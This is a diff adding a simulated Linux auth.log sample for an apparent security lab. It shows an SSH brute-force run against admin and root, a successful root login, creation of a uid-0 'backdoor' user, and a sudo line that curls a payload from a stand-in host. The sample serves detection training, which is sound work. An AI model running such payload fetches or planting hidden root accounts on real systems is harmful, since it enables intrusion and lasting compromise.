@@ -1,0 +1,18 @@
+# SENTINELX lab sample - Linux /var/log/auth.log lines (SIMULATED DATA)
+Nov 19 08:40:11 ubuntu-auth sshd[1201]: Accepted password for alice from 10.0.0.22 port 54321 ssh2
+Nov 19 08:41:03 ubuntu-auth sshd[1205]: Failed password for invalid user admin from 198.51.100.23 port 40122 ssh2
+Nov 19 08:41:09 ubuntu-auth sshd[1205]: Failed password for invalid user admin from 198.51.100.23 port 40124 ssh2
+Nov 19 08:41:16 ubuntu-auth sshd[1205]: Failed password for invalid user admin from 198.51.100.23 port 40126 ssh2
+Nov 19 08:41:22 ubuntu-auth sshd[1205]: Failed password for invalid user admin from 198.51.100.23 port 40128 ssh2
+Nov 19 08:41:29 ubuntu-auth sshd[1205]: Failed password for invalid user admin from 198.51.100.23 port 40130 ssh2
+Nov 19 08:41:36 ubuntu-auth sshd[1205]: Failed password for invalid user root from 198.51.100.23 port 40132 ssh2
+Nov 19 08:41:44 ubuntu-auth sshd[1205]: Failed password for invalid user oracle from 198.51.100.23 port 40134 ssh2
+Nov 19 08:42:10 ubuntu-auth sshd[1205]: Accepted password for root from 198.51.100.23 port 40136 ssh2
+Nov 19 08:42:11 ubuntu-auth sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Nov 19 08:42:30 ubuntu-auth useradd[1310]: new user: name=backdoor uid=0
+Nov 19 08:43:02 ubuntu-auth sshd[1320]: Accepted publickey for deploy from 10.0.0.60 port 50001 ssh2
+Nov 19 08:45:19 ubuntu-auth sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 19 08:50:01 ubuntu-auth sshd[1400]: Failed password for invalid user test from 198.51.100.80 port 50100 ssh2
+Nov 19 08:50:07 ubuntu-auth sshd[1400]: Failed password for invalid user test from 198.51.100.80 port 50102 ssh2
+2026-11-19T09:00:12Z lab-web-01 sshd[2001]: Accepted password for svc_web from 10.0.0.12 port 51000 ssh2
+2026-11-19T09:05:44Z lab-web-01 sudo: svc_web : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/curl http://example.invalid/payload.sh
